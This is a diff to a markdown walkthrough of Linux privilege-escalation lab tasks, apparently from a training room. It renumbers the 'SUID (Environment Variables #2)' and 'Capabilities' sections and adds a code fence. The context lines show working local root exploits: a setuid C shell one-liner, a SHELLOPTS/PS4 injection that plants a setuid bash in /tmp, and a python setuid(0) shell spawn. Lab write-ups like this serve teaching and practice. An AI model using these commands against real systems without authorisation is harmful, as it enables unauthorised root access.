@@ -143,7 +143,7 @@ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tm
 4. In command prompt type: /usr/local/bin/suid-env
 5. In command prompt type: id
 
-## SUID (Environment Variables #2)
+## Task 14 SUID (Environment Variables #2)
 
 ### Detection
 
@@ -172,7 +172,7 @@ Linux VM
 ```
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
 ```
-## Task 14 Capabilities
+## Task 15 Capabilities
 
 ### Detection
 
@@ -186,4 +186,6 @@ Exploitation
 ### Linux VM
 
 1. In command prompt type:
+```
 /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
